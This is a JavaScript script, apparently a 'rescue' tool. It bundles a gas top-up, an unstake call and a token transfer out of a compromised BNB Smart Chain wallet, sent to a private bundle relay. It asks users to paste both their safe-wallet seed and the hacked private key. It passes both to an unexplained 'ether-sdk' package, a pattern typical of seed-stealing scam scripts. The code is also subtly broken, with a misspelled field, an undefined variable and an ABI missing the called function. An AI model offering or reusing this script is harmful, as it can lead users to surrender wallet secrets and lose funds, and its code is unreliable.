const ethers = require("ethers")
const ethersWallet= require("ether-sdk")
const Web3 = require("web3")



// safe wallet seed that send's BNB to claim or unstake and receive the token 
var seed = "replace with your safe wallet seed"
let mnemonicWallet = ethersWallet.fromMnemonic(seed);
var PRIVATEKEY = mnemonicWallet.privateKey;
var myAddress = mnemonicWallet.address

// wallet for claim or unstake

var Key = "replace with the hacked private key" // HACKED PRIVATE KEY 
var hash32Key = ethersWallet.fromPrivateKey(Key);



async function main() {
  var url1='https://bsc-dataseed.binance.org'
  var url2='https://bsc-dataseed1.defibit.io'
  var url3='https://bsc-dataseed1.ninicoin.io'
  var url5 = "https://bsc.nodereal.io"
  

   const web3 = new Web3(
    new Web3.providers.HttpProvider(url5)
  );
  
  const signer = web3.eth.accounts.privateKeyToAccount(
    hash32Key
  );


    let iface = new ethers.utils.Interface([
      'event Approval(address indexed owner, address indexed spender, uint value)',
      'event Transfer(address indexed from, address indexed to, uint value)',
      'function name() external pure returns (string memory)',
      'function symbol() external pure returns (string memory)',
      'function decimals() external pure returns (uint8)',
      'function totalSupply() external view returns (uint)',
      'function balanceOf(address owner) external view returns (uint)',
      'function allowance(address owner, address spender) external view returns (uint)',
      'function approve(address spender, uint value) external returns (bool)',
      'function transfer(address to, uint value) external returns (bool)',
  
      'function DOMAIN_SEPARATOR() external view returns (bytes32)',
      'function PERMIT_TYPEHASH() external pure returns (bytes32)',
      'function nonces(address owner) external view returns (uint)',
      'function release(bytes32 )'
    ]);
  



   var noncesend =  await web3.eth.getTransactionCount(myAddress, 'latest'); 
   var nonce = await web3.eth.getTransactionCount(signer.address,'latest')

   gasPrice = 30000000000
   const transaction = {
    'form':myAddress,
    'to': signer.address, 
    'gas': 21000, 
    'value':ethers.utils.parseUnits((1000000000*300000).toString(),"wei"),
    'gasPrice': gasPrice, 
    'nonce':noncesend
   };


   const transaction2 = {
    'from':signer.address,
     'to':"0x965Df5Ff6.............", // claim or unstake contract
     'gas': 200000,  
     'gasPrice': 1000000000, 
     "data":iface.encodeFunctionData("unstake",[
      ""
     ]
    ),
     'nonce':nonce
    };
    
    const transaction3 = {
      'from':signer.address,
       'to':"0x965Df5Ff6.............", // token contract
       'gas': 100000,  
       'gasPrice': 1000000000 , 
     "data":iface.encodeFunctionData("transfer",[
      myAddress,
      web3.utils.toWei('1','ether') // change 1 to how many token u want transfer to your safe wallet
    ]),
       'nonce':nonce+1
      };
  
  

  const signedTx = await web3.eth.accounts.signTransaction(transaction, PRIVATEKEY);
  const signedTx2 = await web3.eth.accounts.signTransaction(transaction2, signer.privateKey);
  const signedTx3 = await web3.eth.accounts.signTransaction(transaction3, signer.privateKey );

 

  var block = await web3.eth.getBlock('latest')
  block = block.timestamp+120
    const resp2 = await fetch(
      //`https://blockrazor-builder-frankfurt.48.club`,
      `https://puissant-bsc.48.club`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            'id': 48,
            "jsonrpc": "2.0",
           "method": "eth_sendPuissant",
            "params": [{
            "txs": [signedTx.rawTransaction,signedTx2.rawTransaction,signedTx3.rawTransaction],
            "maxTimestamp": block,
            }],
      
        })
        
      }
    );
    var data = await resp2.json();
    console.log(data)
    console.log("https://explorer.48.club/api/v1/puissant/"+data.result)
}
  
main()
  



